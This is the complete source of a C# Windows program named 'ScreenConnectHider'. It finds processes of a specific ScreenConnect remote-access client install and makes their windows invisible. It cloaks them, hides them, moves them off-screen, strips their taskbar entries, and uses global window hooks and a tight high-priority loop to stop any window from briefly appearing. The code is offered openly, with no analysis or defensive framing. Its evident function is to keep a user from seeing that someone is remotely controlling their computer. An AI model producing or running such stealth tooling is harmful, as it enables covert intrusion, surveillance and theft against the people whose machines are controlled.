using System;
using System.Collections.Generic;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

public class ProcRow {
    public int Pid;
    public int Parent;
    public string Path;
}

public static class ScreenConnectHider {
    static readonly string InstallDir = @"C:\Program Files (x86)\ScreenConnect Client (fd944d6092d0e488)";
    static readonly HashSet<int> TargetPids = new HashSet<int>();
    static readonly Dictionary<int, bool> PidCache = new Dictionary<int, bool>();
    static readonly Dictionary<int, IntPtr> PidHooks = new Dictionary<int, IntPtr>();

    static WinEventDelegate WinEventProc;
    static HookProc CbtHookProc;
    static HookProc CallWndHookProc;
    static EnumWindowsProc EnumProc;

    static GCHandle GcWinEvent, GcCbt, GcCallWnd, GcEnum;
    static IntPtr CbtHookHandle = IntPtr.Zero;
    static IntPtr CallWndHookHandle = IntPtr.Zero;
    static ITaskbarList3 TaskbarApi;
    static volatile bool Running = true;

    delegate void WinEventDelegate(IntPtr hook, uint evt, IntPtr hwnd, int idObj, int idChild, uint thread, uint time);
    delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
    delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")] static extern IntPtr SetWinEventHook(uint min, uint max, IntPtr mod, WinEventDelegate proc, uint pid, uint tid, uint flags);
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, HookProc proc, IntPtr mod, uint tid);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")] static extern bool EnumWindows(EnumWindowsProc proc, IntPtr lParam);
    [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr hwnd, out uint pid);
    [DllImport("user32.dll")] static extern bool IsWindow(IntPtr hwnd);
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hwnd, int cmd);
    [DllImport("user32.dll")] static extern int GetWindowLong(IntPtr hwnd, int idx);
    [DllImport("user32.dll")] static extern int SetWindowLong(IntPtr hwnd, int idx, int val);
    [DllImport("user32.dll")] static extern bool SetWindowPos(IntPtr hwnd, IntPtr ins, int x, int y, int cx, int cy, uint flags);
    [DllImport("user32.dll")] static extern bool GetMessage(out MSG msg, IntPtr hwnd, uint fmin, uint fmax);
    [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG msg);
    [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG msg);
    [DllImport("dwmapi.dll")] static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int val, int size);

    [StructLayout(LayoutKind.Sequential)] struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int pt_x; public int pt_y; }
    [StructLayout(LayoutKind.Sequential)] struct CWPSTRUCT { public IntPtr lParam; public IntPtr wParam; public uint message; public IntPtr hwnd; }
    [StructLayout(LayoutKind.Sequential)] struct WINDOWPOS { public IntPtr hwnd; public IntPtr ins; public int x; public int y; public int cx; public int cy; public uint flags; }

    const uint WINEVENT_OUTOFCONTEXT = 0;
    const uint EVENT_OBJECT_CREATE = 0x8000;
    const uint EVENT_OBJECT_SHOW = 0x8002;
    const uint EVENT_OBJECT_UNHIDE = 0x80018;
    const uint EVENT_SYSTEM_FOREGROUND = 0x0003;
    const uint EVENT_SYSTEM_MINIMIZEEND = 0x0017;
    const int WH_CBT = 5;
    const int WH_CALLWNDPROC = 4;
    const int HCBT_CREATEWND = 3;
    const int HCBT_ACTIVATE = 5;
    const int WM_SHOWWINDOW = 0x0018;
    const int WM_WINDOWPOSCHANGING = 0x0046;
    const int GWL_EXSTYLE = -20;
    const int SW_HIDE = 0;
    const int DWMWA_CLOAK = 13;
    const uint SWP_NOSIZE = 0x0001;
    const uint SWP_NOACTIVATE = 0x0010;
    const uint SWP_HIDEWINDOW = 0x0080;
    static readonly IntPtr HWND_BOTTOM = new IntPtr(1);

    [ComImport][Guid("56FDF344-FD6D-11d0-958A-006097C9A090")][ClassInterface(ClassInterfaceType.None)]
    class TaskbarListCom { }

    [ComImport][Guid("692B7225-BAE9-4ADD-A911-0EAA1058AF23")][InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface ITaskbarList3 {
        [PreserveSig] int HrInit();
        [PreserveSig] int DeleteTab(IntPtr hwnd);
    }

    static bool EnumCallback(IntPtr hwnd, IntPtr lParam) {
        HideTargetWindow(hwnd);
        return true;
    }

    static void InitAll() {
        WinEventProc = OnWinEvent;
        CbtHookProc = OnCbtHook;
        CallWndHookProc = OnCallWndHook;
        EnumProc = EnumCallback;
        GcWinEvent = GCHandle.Alloc(WinEventProc);
        GcCbt = GCHandle.Alloc(CbtHookProc);
        GcCallWnd = GCHandle.Alloc(CallWndHookProc);
        GcEnum = GCHandle.Alloc(EnumProc);
        try {
            TaskbarApi = (ITaskbarList3)new TaskbarListCom();
            TaskbarApi.HrInit();
        } catch { }
    }

    static bool IsInstallPid(int pid) {
        if (pid <= 0) return false;
        lock (TargetPids) { if (TargetPids.Contains(pid)) return true; }
        bool cached;
        lock (PidCache) { if (PidCache.TryGetValue(pid, out cached)) return cached; }
        bool ok = false;
        try {
            using (ManagementObject o = new ManagementObject("Win32_Process.Handle='" + pid + "'")) {
                o.Get();
                object p = o["ExecutablePath"];
                string path = p != null ? p.ToString() : "";
                ok = path.StartsWith(InstallDir, StringComparison.OrdinalIgnoreCase);
            }
        } catch { }
        lock (PidCache) { PidCache[pid] = ok; }
        if (ok) lock (TargetPids) { TargetPids.Add(pid); }
        return ok;
    }

    static bool IsTargetHwnd(IntPtr hwnd) {
        if (hwnd == IntPtr.Zero || !IsWindow(hwnd)) return false;
        uint pid;
        GetWindowThreadProcessId(hwnd, out pid);
        return IsInstallPid((int)pid);
    }

    static void CloakAndHide(IntPtr hwnd) {
        if (hwnd == IntPtr.Zero || !IsWindow(hwnd)) return;
        int cloak = 1;
        try { DwmSetWindowAttribute(hwnd, DWMWA_CLOAK, ref cloak, 4); } catch { }
        ShowWindow(hwnd, SW_HIDE);
        SetWindowPos(hwnd, HWND_BOTTOM, -32000, -32000, 0, 0, SWP_NOSIZE | SWP_NOACTIVATE | SWP_HIDEWINDOW);
        try {
            int s = GetWindowLong(hwnd, GWL_EXSTYLE);
            SetWindowLong(hwnd, GWL_EXSTYLE, (s | 0x80) & ~0x40000);
        } catch { }
        ShowWindow(hwnd, SW_HIDE);
        if (TaskbarApi != null) { try { TaskbarApi.DeleteTab(hwnd); } catch { } }
    }

    static void HideTargetWindow(IntPtr hwnd) {
        if (!IsTargetHwnd(hwnd)) return;
        CloakAndHide(hwnd);
    }

    static void RefreshPids() {
        HashSet<int> found = new HashSet<int>();
        try {
            List<ProcRow> all = new List<ProcRow>();
            using (ManagementObjectSearcher s = new ManagementObjectSearcher("SELECT ProcessId,ParentProcessId,ExecutablePath FROM Win32_Process")) {
                foreach (ManagementObject o in s.Get()) {
                    ProcRow row = new ProcRow();
                    row.Pid = Convert.ToInt32(o["ProcessId"]);
                    row.Parent = Convert.ToInt32(o["ParentProcessId"]);
                    object p = o["ExecutablePath"];
                    row.Path = p != null ? p.ToString() : "";
                    all.Add(row);
                }
            }
            HashSet<int> set = new HashSet<int>();
            foreach (ProcRow row in all) {
                if (!string.IsNullOrEmpty(row.Path) && row.Path.StartsWith(InstallDir, StringComparison.OrdinalIgnoreCase))
                    set.Add(row.Pid);
            }
            bool changed = true;
            while (changed) {
                changed = false;
                foreach (ProcRow row in all) {
                    if (set.Contains(row.Parent) && !set.Contains(row.Pid)) { set.Add(row.Pid); changed = true; }
                }
            }
            foreach (int id in set) found.Add(id);
        } catch { }
        lock (TargetPids) {
            TargetPids.Clear();
            foreach (int id in found) TargetPids.Add(id);
        }
        lock (PidCache) { foreach (int id in found) PidCache[id] = true; }
    }

    static void InstallHooks() {
        IntPtr mod = Marshal.GetHINSTANCE(typeof(ScreenConnectHider).Module);
        if (CbtHookHandle == IntPtr.Zero)
            CbtHookHandle = SetWindowsHookEx(WH_CBT, CbtHookProc, mod, 0);
        if (CallWndHookHandle == IntPtr.Zero)
            CallWndHookHandle = SetWindowsHookEx(WH_CALLWNDPROC, CallWndHookProc, mod, 0);
        SetWinEventHook(EVENT_OBJECT_CREATE, EVENT_OBJECT_SHOW, IntPtr.Zero, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
        SetWinEventHook(EVENT_OBJECT_UNHIDE, EVENT_OBJECT_UNHIDE, IntPtr.Zero, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
        SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
        SetWinEventHook(EVENT_SYSTEM_MINIMIZEEND, EVENT_SYSTEM_MINIMIZEEND, IntPtr.Zero, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
        lock (TargetPids) {
            foreach (int pid in TargetPids) {
                if (!PidHooks.ContainsKey(pid)) {
                    IntPtr h = SetWinEventHook(EVENT_OBJECT_CREATE, EVENT_OBJECT_SHOW, IntPtr.Zero, WinEventProc, (uint)pid, 0, WINEVENT_OUTOFCONTEXT);
                    if (h != IntPtr.Zero) PidHooks[pid] = h;
                }
            }
        }
    }

    static void OnWinEvent(IntPtr hook, uint evt, IntPtr hwnd, int idObj, int idChild, uint thread, uint time) {
        HideTargetWindow(hwnd);
    }

    static IntPtr OnCbtHook(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (nCode == HCBT_CREATEWND || nCode == HCBT_ACTIVATE)) {
            uint pid;
            GetWindowThreadProcessId(wParam, out pid);
            if (IsInstallPid((int)pid)) CloakAndHide(wParam);
        }
        return CallNextHookEx(CbtHookHandle, nCode, wParam, lParam);
    }

    static IntPtr OnCallWndHook(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            CWPSTRUCT c = (CWPSTRUCT)Marshal.PtrToStructure(lParam, typeof(CWPSTRUCT));
            if (IsTargetHwnd(c.hwnd)) {
                if (c.message == WM_WINDOWPOSCHANGING) {
                    WINDOWPOS wp = (WINDOWPOS)Marshal.PtrToStructure(c.lParam, typeof(WINDOWPOS));
                    wp.flags = wp.flags | SWP_HIDEWINDOW;
                    wp.x = -32000;
                    wp.y = -32000;
                    Marshal.StructureToPtr(wp, c.lParam, false);
                }
                if (c.message == WM_SHOWWINDOW) CloakAndHide(c.hwnd);
            }
        }
        return CallNextHookEx(CallWndHookHandle, nCode, wParam, lParam);
    }

    static void HideLoop() {
        Thread.CurrentThread.Priority = ThreadPriority.Highest;
        while (Running) {
            EnumWindows(EnumProc, IntPtr.Zero);
            if ((Environment.TickCount % 16) == 0) {
                RefreshPids();
                InstallHooks();
            }
            Thread.Sleep(1);
        }
    }

    static void PumpLoop() {
        Thread.CurrentThread.Priority = ThreadPriority.Highest;
        MSG msg;
        while (Running && GetMessage(out msg, IntPtr.Zero, 0, 0)) {
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }
    }

    public static void Run() {
        bool created;
        Mutex mtx = new Mutex(true, "Local\\ScHideZeroFlash", out created);
        if (!created) return;
        InitAll();
        RefreshPids();
        InstallHooks();
        EnumWindows(EnumProc, IntPtr.Zero);
        Thread t1 = new Thread(HideLoop);
        t1.IsBackground = true;
        t1.Priority = ThreadPriority.Highest;
        t1.Start();
        Thread t2 = new Thread(PumpLoop);
        t2.IsBackground = true;
        t2.Priority = ThreadPriority.Highest;
        t2.Start();
        Application.Run();
        mtx.ReleaseMutex();
        mtx.Close();
    }
}

static class Program {
    [STAThread]
    static void Main() {
        ScreenConnectHider.Run();
    }
}
